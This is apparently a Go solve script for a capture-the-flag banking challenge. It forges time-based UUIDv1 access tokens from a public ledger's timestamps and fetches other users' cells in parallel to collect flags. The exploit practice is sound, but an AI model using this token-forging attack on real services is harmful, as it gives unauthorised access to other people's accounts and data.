package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"sync"
	"time"
)

const (
	base           = "https://vintage-bank.solarctf.ru"
	clockSeqRaw    = 0x9a2b
	node           = 0x0242ac110002
	uuidEpochDelta = 12219292800 // seconds 1582-10-15 -> 1970-01-01
	workers        = 24
)

var client = &http.Client{Timeout: 20 * time.Second}

// tokenForUnix строит UUIDv1 по unix-секундам (subsecond = 0).
func tokenForUnix(unix int64) string {
	t := uint64(unix+uuidEpochDelta) * 10_000_000
	timeLow := uint32(t & 0xffffffff)
	timeMid := uint16((t >> 32) & 0xffff)
	timeHi := uint16(((t >> 48) & 0x0fff) | 0x1000)
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		timeLow, timeMid, timeHi, clockSeqRaw, node)
}

func httpJSON(path, method string, out any) error {
	var body io.Reader
	if method == "POST" {
		body = bytes.NewReader([]byte{})
	}
	req, err := http.NewRequest(method, base+path, body)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", "solve/1")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		return fmt.Errorf("http %d", resp.StatusCode)
	}
	return json.NewDecoder(resp.Body).Decode(out)
}

type RentResp struct {
	Cell  any    `json:"cell"`
	Token string `json:"token"`
}

type LedgerEntry struct {
	Ord   int    `json:"ord"`
	Date  string `json:"date"`
	Owner string `json:"owner"`
}

type CellResp struct {
	Cell  any    `json:"cell"`
	Owner string `json:"owner"`
	Flag  string `json:"flag"`
}

func main() {
	// 1) sanity check модели токена
	var mine RentResp
	if err := httpJSON("/api/rent", "POST", &mine); err != nil {
		fmt.Fprintln(os.Stderr, "rent:", err)
		os.Exit(1)
	}
	now := time.Now().Unix()
	ok := false
	for d := int64(-3); d <= 3; d++ {
		if mine.Token == tokenForUnix(now+d) {
			ok = true
			break
		}
	}
	if !ok {
		fmt.Fprintln(os.Stderr, "[!] token model mismatch — generator constants may have changed")
	}
	fmt.Printf("[*] rented cell %v token %s\n", mine.Cell, mine.Token)

	// 2) ledger -> кандидаты
	var ledger []LedgerEntry
	if err := httpJSON("/api/ledger", "GET", &ledger); err != nil {
		fmt.Fprintln(os.Stderr, "ledger:", err)
		os.Exit(1)
	}

	type cand struct {
		e   LedgerEntry
		tok string
	}
	cands := make([]cand, 0, len(ledger))
	for _, e := range ledger {
		// naive UTC, как в питоновском mktime(..) - time.timezone
		ts, err := time.ParseInLocation("02.01.2006 15:04:05", e.Date, time.UTC)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] bad date %q: %v\n", e.Date, err)
			continue
		}
		cands = append(cands, cand{e, tokenForUnix(ts.Unix())})
	}

	// 3) параллельный перебор
	type result struct {
		e    LedgerEntry
		tok  string
		data *CellResp
	}
	results := make(chan result)
	sem := make(chan struct{}, workers)
	var wg sync.WaitGroup

	for _, c := range cands {
		wg.Add(1)
		go func(c cand) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			var data CellResp
			if err := httpJSON("/api/cell/"+c.tok, "GET", &data); err != nil {
				results <- result{c.e, c.tok, nil}
				return
			}
			results <- result{c.e, c.tok, &data}
		}(c)
	}

	go func() { wg.Wait(); close(results) }()

	var flags []string
	for r := range results {
		if r.data == nil || r.data.Cell == nil {
			continue
		}
		mark := ""
		if r.data.Flag != "" {
			mark = " <-- FLAG"
			flags = append(flags, r.data.Flag)
		}
		fmt.Printf("[+] ord=%2d cell=%v owner=%q token=%s%s\n",
			r.e.Ord, r.data.Cell, r.data.Owner, r.tok, mark)
	}

	if len(flags) == 0 {
		fmt.Println("\n[*] FLAGS: none found")
	} else {
		fmt.Println("\n[*] FLAGS:", flags)
	}
}
